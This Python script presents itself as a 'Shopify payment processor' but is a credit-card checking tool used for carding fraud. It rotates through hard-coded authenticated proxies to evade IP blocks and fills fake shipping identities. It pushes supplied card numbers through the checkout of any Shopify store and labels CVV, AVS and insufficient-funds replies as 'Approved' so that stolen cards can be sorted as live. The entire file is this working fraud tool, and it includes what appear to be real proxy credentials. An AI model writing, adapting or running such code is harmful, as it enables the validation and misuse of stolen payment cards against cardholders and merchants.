import requests
import random
import string
import json
import time
import urllib.parse
import re
import os
from urllib.parse import urlparse, parse_qs

class ShopifyPaymentProcessor:
    def __init__(self):
        self.session = requests.Session()
        self.retry_count = 0
        self.max_retries = 4
        self.proxies = [
            "175.29.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "46.3.135.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "158.46.160.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "37.218.219.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "46.3.63.7:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "37.218.221.8:5433:5K05CT880J2D:VE1MSDRGFDZB",
            "81.180.253.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "178.171.88.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "85.28.57.8:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "45.140.172.7:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "91.108.230.8:5433:1ADM7A56GE0B:8YD2Y736XJ10",
            "178.171.106.8:5433:1ADM7A56GE0B:8YD2Y736XJ10"
        ]
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        self.setup_proxy()

    def setup_proxy(self):
        proxy_str = random.choice(self.proxies)
        parts = proxy_str.split(':')
        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def generate_random_string(self, length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def extract_between(self, text, start, end):
        try:
            start_idx = text.find(start)
            if start_idx == -1:
                return None
            start_idx += len(start)
            end_idx = text.find(end, start_idx)
            if end_idx == -1:
                return None
            return text[start_idx:end_idx]
        except:
            return None

    def extract_patterns(self, text, patterns):
        results = []
        for pattern in patterns:
            try:
                # Escape special regex characters in the pattern parts
                start_pattern = re.escape(pattern[0])
                end_pattern = re.escape(pattern[1])
                regex_pattern = f"{start_pattern}(.*?){end_pattern}"
                matches = re.findall(regex_pattern, text)
                results.append(matches)
            except Exception as e:
                print(f"Regex error: {str(e)}")
                results.append([])
        return results

    def format_month(self, month):
        return str(int(month)) if month.startswith('0') else month

    def get_user_data(self, nat="US"):
        if nat == "AU":
            return {
                'email': f"test{random.randint(1000, 9999)}@example.com",
                'first_name': "John",
                'last_name': "Smith",
                'city': "Hambidge",
                'street': "56 Bayview Road",
                'state': "South Australia",
                'zip': "5642",
                'country': "Australia"
            }
        else:
            return {
                'email': f"test{random.randint(1000, 9999)}@example.com",
                'first_name': "John",
                'last_name': "Doe",
                'city': "New York",
                'street': "118 W 132nd St",
                'state': "New York",
                'zip': "10027",
                'country': "United States"
            }

    def process_payment(self, cc, month, year, cvv, site_url):
        try:
            if len(year) <= 2:
                year = f"20{year}"
            
            sub_month = self.format_month(month)
            parsed_url = urlparse(site_url)
            domain = parsed_url.netloc
            
            cookie_id = self.generate_random_string(10)
            self.session.headers.update({
                'User-Agent': self.user_agent,
                'Host': domain,
                'Origin': f"https://{domain}",
                'Referer': site_url
            })

            response1 = self.session.get(site_url)
            if response1.status_code == 430:
                return {'status': False, 'message': 'IP blocked, change IP'}

            variants = self.extract_patterns(response1.text, [['"variants":[{"id":', ',"']])
            if not variants or not variants[0]:
                return {'status': False, 'message': 'No product variants found'}
            
            cart_id = variants[0][0]
            
            cart_response = self.add_to_cart(domain, cart_id)
            if not cart_response['success']:
                return cart_response

            checkout_url = self.get_checkout_url(domain)
            if not checkout_url:
                return {'status': False, 'message': 'Failed to get checkout URL'}

            user_data = self.get_user_data()
            
            shipping_response = self.submit_shipping_info(checkout_url, user_data)
            if not shipping_response['success']:
                return shipping_response

            payment_response = self.process_card_payment(
                checkout_url, domain, cc, month, year, cvv, user_data
            )
            
            return payment_response

        except Exception as e:
            return {'status': False, 'message': f'Error: {str(e)}'}

    def add_to_cart(self, domain, cart_id):
        cart_url = f"https://{domain}/cart/add.js"
        data = f'id={cart_id}&quantity=1'
        
        response = self.session.post(cart_url, data=data)
        
        if '/cart' in response.text and self.retry_count < self.max_retries:
            cart_url = f"https://{domain}/cart/add"
            self.retry_count += 1
            return self.add_to_cart(domain, cart_id)
        
        return {'success': True}

    def get_checkout_url(self, domain):
        response = self.session.get(f"https://{domain}/checkout")
        location = self.extract_between(response.text, 'location: ', '\nx-sorting-hat-podid:')
        if location:
            parsed = urlparse(location.strip())
            return f"{domain}{parsed.path}".rstrip('_')
        return None

    def submit_shipping_info(self, checkout_url, user_data):
        auth_token = self.generate_random_string(86)
        
        shipping_data = {
            '_method': 'patch',
            'authenticity_token': auth_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': user_data['email'],
            'checkout[shipping_address][first_name]': user_data['first_name'],
            'checkout[shipping_address][last_name]': user_data['last_name'],
            'checkout[shipping_address][address1]': user_data['street'],
            'checkout[shipping_address][city]': user_data['city'],
            'checkout[shipping_address][country]': user_data['country'],
            'checkout[shipping_address][province]': user_data['state'],
            'checkout[shipping_address][zip]': user_data['zip'],
            'checkout[shipping_address][phone]': '9006371822'
        }
        
        response = self.session.post(f"https://{checkout_url}", data=shipping_data)
        return {'success': response.status_code == 200}

    def get_shipping_rates(self, checkout_url):
        time.sleep(5)
        response = self.session.get(f"https://{checkout_url}/shipping_rates?step=shipping_method")
        
        shipping_method = self.extract_between(response.text, 'data-shipping-method="', '"')
        payment_gateway = self.extract_between(response.text, '[data-select-gateway=', ']')
        
        if not shipping_method and self.retry_count < self.max_retries:
            self.retry_count += 1
            return self.get_shipping_rates(checkout_url)
        
        return {
            'shipping_method': urllib.parse.unquote(shipping_method) if shipping_method else None,
            'payment_gateway': payment_gateway
        }

    def process_card_payment(self, checkout_url, domain, cc, month, year, cvv, user_data):
        rates = self.get_shipping_rates(checkout_url)
        if not rates['shipping_method']:
            return {'status': False, 'message': 'No shipping method available'}

        auth_token = self.generate_random_string(86)
        sub_month = self.format_month(month)
        
        card_session_data = {
            "credit_card": {
                "number": cc,
                "name": f"{user_data['first_name']} {user_data['last_name']}",
                "month": int(sub_month),
                "year": int(year),
                "verification_value": cvv
            },
            "payment_session_scope": domain
        }
        
        session_response = self.session.post(
            "https://deposit.us.shopifycs.com/sessions",
            json=card_session_data,
            headers={'Content-Type': 'application/json'}
        )
        
        session_id = self.extract_between(session_response.text, '"id":"', '"')
        if not session_id:
            return {'status': False, 'message': 'Failed to create payment session'}

        payment_data = {
            '_method': 'patch',
            'authenticity_token': auth_token,
            'previous_step': 'payment_method',
            'step': '',
            's': session_id,
            'checkout[payment_gateway]': rates['payment_gateway'],
            'complete': '1'
        }
        
        payment_response = self.session.post(f"https://{checkout_url}", data=payment_data)
        
        time.sleep(5)
        
        validation_response = self.session.get(f"https://{checkout_url}?from_processing_page=1&validate=true")
        
        return self.parse_payment_result(validation_response.text, checkout_url)

    def parse_payment_result(self, response_text, checkout_url):
        message = self.extract_between(response_text, '<p class="notice__text">', '</p></div></div>')
        if message:
            message = message.strip()

        gateway_type = self.determine_gateway_type(message, checkout_url)
        
        if f"https://{checkout_url}/thank_you" in response_text:
            return {
                'status': True,
                'result': 'Approved - Charged',
                'message': 'Payment successful',
                'gateway': gateway_type
            }
        elif self.is_cvv_error(message):
            return {
                'status': True,
                'result': 'Approved - CVV',
                'message': message,
                'gateway': gateway_type
            }
        elif self.is_avs_error(message):
            return {
                'status': True,
                'result': 'Approved - AVS',
                'message': message,
                'gateway': gateway_type
            }
        elif self.is_insufficient_funds(message):
            return {
                'status': True,
                'result': 'Approved - Insufficient Funds',
                'message': message,
                'gateway': gateway_type
            }
        else:
            return {
                'status': False,
                'result': 'Declined',
                'message': message or 'Transaction declined',
                'gateway': gateway_type
            }

    def determine_gateway_type(self, message, checkout_url):
        if not message:
            return "Shopify"
        
        braintree_messages = ["2010 Card Issuer Declined CVV", "2047 Call Issuer", "2007 No Account"]
        if any(msg in message for msg in braintree_messages):
            return "Shopify + Braintree"
        
        if "CVV does not match" in message:
            return "Shopify + Spreedly"
        
        if "CVD ERROR" in message or "AUTH DECLINED" in message:
            return "Shopify + Moneris"
        
        if "Transaction Normal" in message:
            return "Shopify + Payeezy"
        
        if "CVV2 Mismatch" in message and "10502" in message:
            return "Shopify + Payflow"
        
        if "CVC Declined" in message or "Issuer Suspected Fraud" in message:
            return "Shopify + Adyen"
        
        if '/checkouts/c/' in checkout_url:
            return "Shopify + Stripe"
        
        return "Shopify"

    def is_cvv_error(self, message):
        cvv_errors = ["CVV does not match", "CVC Declined", "CVV2 Mismatch", "Security codes does not match"]
        return any(error in message for error in cvv_errors) if message else False

    def is_avs_error(self, message):
        avs_errors = ["AVS", "Address not Verified", "avs"]
        return any(error in message for error in avs_errors) if message else False

    def is_insufficient_funds(self, message):
        fund_errors = ["Insufficient Funds", "Insuff Funds", "Credit Floor"]
        return any(error in message for error in fund_errors) if message else False

def process_shopify_payment(cc, month, year, cvv, site_url):
    processor = ShopifyPaymentProcessor()
    return processor.process_payment(cc, month, year, cvv, site_url)

def main():
    # Prompt the user for input
    cc = input("Enter credit card number: ")
    month = input("Enter expiration month: ")
    year = input("Enter expiration year: ")
    cvv = input("Enter CVV: ")
    site_url = input("Enter site URL: ")

    # Process the payment
    result = process_shopify_payment(cc, month, year, cvv, site_url)

    # Print the result
    print(json.dumps(result, indent=2))
    
if __name__ == "__main__":
    main()